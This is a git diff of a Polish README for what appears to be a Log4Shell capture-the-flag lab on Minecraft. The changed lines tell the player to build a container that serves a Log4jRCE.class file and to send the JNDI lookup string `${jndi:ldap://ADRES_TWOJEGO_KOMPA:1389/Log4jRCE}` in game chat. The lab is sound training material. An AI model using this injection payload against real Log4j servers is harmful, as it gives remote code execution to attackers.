@@ -80,11 +80,9 @@ Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hack
       - a po uruchomieniu kontenera, będzie serwowany plik "Log4jRCE.class" na porcie *:8888* tego kontenera,
       - zbuduj obraz: `docker build . -t codehttp`,
       - uruchom kontener: `docker run -p 8888:8888 -ti codehttp`,
+   3. **NA CZACIE W MINECRAFT WYŚLIJ:**
+      `${jndi:ldap://ADRES_TWOJEGO_KOMPA:1389/Log4jRCE}`
 
-<<<<<<< HEAD
-   3. **Interesujący cię plik jest umieszczony gdzieś na systemie:**
-      - 
-=======
 ### 3. Interesujący cię plik jest umieszczony gdzieś na systemie:
    wyszukaj plik komendą `find / -name "flag.txt"`,
 
@@ -103,7 +101,6 @@ Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hack
    1. wprowadź flagę do skrzynki,
    2. odczekaj chwilkę,
    3. Zapraszamy do wspólnej gry! <3
->>>>>>> all
 
 
 ## Twoje zadanie
